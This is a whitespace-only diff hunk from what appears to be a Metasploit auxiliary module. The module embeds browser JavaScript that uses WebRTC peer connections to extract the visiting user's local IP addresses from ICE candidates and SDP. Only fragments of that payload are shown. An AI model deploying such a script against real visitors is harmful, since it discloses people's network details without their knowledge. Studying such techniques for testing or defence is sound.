@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Auxiliary
   def setup
     @html = %|
     <script>
-function userIP(onNewIP) { 
+function userIP(onNewIP){
 var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
     var pc = new myPeerConnection({
         iceServers: []
@@ -56,7 +56,7 @@ pc.createDataChannel("");
             line.match(ipRegex).forEach(iterateIP);
         });
         pc.setLocalDescription(sdp, noop, noop);
-    }).catch(function(reason) {	
+}).catch(function(reason) {
 });
 pc.onicecandidate = function(ice) {
 if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
